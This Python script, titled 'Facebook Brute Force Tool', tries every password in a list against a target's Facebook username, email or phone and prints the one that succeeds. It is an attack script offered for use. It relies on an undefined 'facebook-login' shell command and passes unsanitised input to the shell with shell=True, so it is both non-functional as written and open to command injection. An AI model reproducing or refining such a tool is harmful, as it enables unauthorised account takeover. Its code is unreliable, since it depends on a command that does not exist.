import pyfiglet
import subprocess
import time
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# ASCII Art Banner
banner = pyfiglet.figlet_format("Facebook Brute Force Tool", font="slant")
print(Fore.YELLOW + banner + Style.RESET_ALL)

# Get username and password list path from user
username = input(Fore.GREEN + "Enter Facebook username,email,phone: " + Style.RESET_ALL)
password_list_path = input(Fore.GREEN + "Enter path to password list file: " + Style.RESET_ALL)

# Open password list file
with open(password_list_path, 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# Start brute force attack
print(Fore.YELLOW + f"Starting brute force attack on {username}..." + Style.RESET_ALL)
start_time = time.time()

for password in passwords:
    # Construct Facebook login command
    command = f"facebook-login -u {username} -p {password}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if login was successful
    if b"Login successful" in output:
        print(Fore.GREEN + f"Password found: {password}" + Style.RESET_ALL)
        print(Fore.GREEN + f"Time taken: {time.time() - start_time:.2f} seconds" + Style.RESET_ALL)
        break

print(Fore.RED + "Brute force attack stopped." + Style.RESET_ALL)
